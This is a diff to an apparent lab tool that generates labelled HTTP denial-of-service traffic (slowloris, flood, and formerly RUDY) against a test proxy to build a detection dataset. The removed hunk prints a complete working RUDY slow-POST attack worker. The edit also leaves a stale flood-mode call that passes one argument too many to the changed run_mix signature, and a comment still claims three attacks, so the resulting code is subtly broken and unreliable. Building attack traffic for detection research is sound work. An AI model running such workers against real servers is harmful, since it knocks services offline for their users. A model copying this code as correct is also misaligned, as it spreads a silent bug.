@@ -34,7 +34,7 @@ Each generator runs in its own container with its own IP. The capture is on
 the proxy's interface, so we can label by source IP:
 
     legit-loadgen  -> benign
-    slow-gen       -> slowloris / rudy
+    slow-gen       -> slowloris
     flood-gen      -> flood
 
 That label is objective. No heuristics, no manual annotation.
@@ -223,33 +223,6 @@ async def slowloris_worker(conn_id: int, duration: int,
     writer.close()
 
 
-# ---------------------------------------------------------------------------
-# RUDY — valid complete header, enormous Content-Length, body trickled
-# ---------------------------------------------------------------------------
-async def rudy_worker(conn_id: int, duration: int,
-                      declared: int = 5_000_000, chunk: int = 10,
-                      interval: float = 0.5, stagger: float = 0.0,
-                      src_ip: str | None = None):
-    if stagger > 0:
-        await asyncio.sleep(random.uniform(0.0, stagger))
-    end = time.time() + duration
-    if time.time() >= end:
-        return
-    reader, writer = await _connect(src_ip)
-    gt_header = _gt_header("rudy")
-    head = (f"POST /api/upload/{conn_id} HTTP/1.1\r\n"
-            f"Host: api\r\nContent-Length: {declared}\r\n"
-            f"Content-Type: application/octet-stream\r\n").encode()
-    head += gt_header + b"\r\n"
-    writer.write(head)
-    await writer.drain()
-
-    while time.time() < end:
-        writer.write(b"x" * chunk)
-        await writer.drain()
-        await asyncio.sleep(interval)
-    writer.close()
-
 
 # ---------------------------------------------------------------------------
 # FLOOD — high rate, keep-alive, every request complete
@@ -300,8 +273,8 @@ def _ip_for(i: int) -> str | None:
     return SRC_IPS[i % len(SRC_IPS)]
 
 
-async def run_mix(duration: int, n_benign: int, n_slow: int, n_rudy: int,
-                  n_flood: int, label: str, stagger: float | None = None,
+async def run_mix(duration: int, n_benign: int, n_slow: int, n_flood: int,
+                  label: str, stagger: float | None = None,
                   req_per_conn: int = 200):
     """Run the requested attack workers from THIS container.
 
@@ -323,15 +296,12 @@ async def run_mix(duration: int, n_benign: int, n_slow: int, n_rudy: int,
     for i in range(n_slow):
         tasks.append(slowloris_worker(i, duration, stagger=stagger,
                                       src_ip=_ip_for(i)))
-    for i in range(n_rudy):
-        tasks.append(rudy_worker(i, duration, stagger=stagger,
-                                 src_ip=_ip_for(i)))
     for i in range(n_flood):
         tasks.append(flood_worker(i, duration, req_per_conn=req_per_conn,
                                   stagger=stagger, src_ip=_ip_for(i)))
 
     print(f"[{label}] {n_benign} benign + {n_slow} slowloris + "
-          f"{n_rudy} rudy + {n_flood} flood, for {duration}s")
+          f"{n_flood} flood, for {duration}s")
     await asyncio.gather(*tasks, return_exceptions=True)
 
 
@@ -387,13 +357,10 @@ MIXED_PROFILES = [
     "benign_only",             # innocent user — never attacks
     "slow_only",               # pure slowloris bot
     "flood_only",              # pure flood bot
-    "rudy_only",               # pure rudy bot
     "benign_then_slow",        # real work, then turns slowloris (compromised host)
     "benign_then_flood",       # real work, then floods
-    "benign_then_rudy",        # real work, then rudy
     "slow_then_benign",        # attacks, then goes quiet/innocent
     "flood_then_benign",       # flood stops, host looks normal again
-    "rudy_then_benign",        # rudy stops, host looks normal again
     "benign_concurrent_slow",  # browsing WHILE holding slowloris sockets
     "slow_and_flood",          # dual-technique bot
 ]
@@ -443,25 +410,17 @@ async def mixed_ip_worker(i: int, profile: str, duration: int,
         await _bounded(slowloris_worker(i, duration, stagger=duration * 0.6, src_ip=src_ip), span)
     elif profile == "flood_only":
         await _bounded(flood_worker(i, duration, req_per_conn=req_per_conn, stagger=duration * 0.6, src_ip=src_ip), span)
-    elif profile == "rudy_only":
-        await _bounded(rudy_worker(i, duration, stagger=duration * 0.6, src_ip=src_ip), span)
     elif profile == "benign_then_slow":
         await asyncio.gather(ben(half, 0.0),
                              _after(half, _bounded(slowloris_worker(i, half, src_ip=src_ip), hspan)))
     elif profile == "benign_then_flood":
         await asyncio.gather(ben(half, 0.0),
                              _after(half, _bounded(flood_worker(i, half, req_per_conn=req_per_conn, src_ip=src_ip), hspan)))
-    elif profile == "benign_then_rudy":
-        await asyncio.gather(ben(half, 0.0),
-                             _after(half, _bounded(rudy_worker(i, half, src_ip=src_ip), hspan)))
     elif profile == "slow_then_benign":
         await asyncio.gather(_bounded(slowloris_worker(i, half, src_ip=src_ip), hspan),
                              _after(half, ben(half, 0.0)))
     elif profile == "flood_then_benign":
         await asyncio.gather(_bounded(flood_worker(i, half, req_per_conn=req_per_conn, src_ip=src_ip), hspan),
-                             _after(half, ben(half, 0.0)))
-    elif profile == "rudy_then_benign":
-        await asyncio.gather(_bounded(rudy_worker(i, half, src_ip=src_ip), hspan),
                              _after(half, ben(half, 0.0)))
     elif profile == "benign_concurrent_slow":
         await asyncio.gather(ben(duration, duration * 0.6),
@@ -488,11 +447,10 @@ def main() -> None:
     ap = argparse.ArgumentParser(
         description="Generate labelled L7 attack traffic against the lab proxy")
     ap.add_argument("--mode", required=True,
-                    choices=["benign", "mix", "slow", "rudy", "flood", "mixed"])
+                    choices=["benign", "mix", "slow", "flood", "mixed"])
     ap.add_argument("--duration", type=int, default=120)
     ap.add_argument("--benign", type=int, default=50)
     ap.add_argument("--slow", type=int, default=200)
-    ap.add_argument("--rudy", type=int, default=100)
     ap.add_argument("--flood", type=int, default=20)
     ap.add_argument("--req-per-conn", type=int, default=200,
                     help="flood: requests written per write() burst "
@@ -520,9 +478,7 @@ def main() -> None:
     if args.mode == "benign":
         asyncio.run(run_benign_only(args.duration, args.benign, args.label))
     elif args.mode == "slow":
-        asyncio.run(run_mix(args.duration, 0, args.slow, 0, 0, args.label))
-    elif args.mode == "rudy":
-        asyncio.run(run_mix(args.duration, 0, 0, args.rudy, 0, args.label))
+        asyncio.run(run_mix(args.duration, 0, args.slow, 0, args.label))
     elif args.mode == "flood":
         asyncio.run(run_mix(args.duration, 0, 0, 0, args.flood, args.label,
                             req_per_conn=args.req_per_conn))
@@ -530,8 +486,8 @@ def main() -> None:
         asyncio.run(run_mixed(args.duration, args.mixed, args.label,
                               req_per_conn=args.req_per_conn))
     else:  # mix: all three attacks from this one attack container
-        asyncio.run(run_mix(args.duration, 0, args.slow, args.rudy,
-                            args.flood, args.label))
+        asyncio.run(run_mix(args.duration, 0, args.slow, args.flood,
+                            args.label))
 
 
 if __name__ == "__main__":
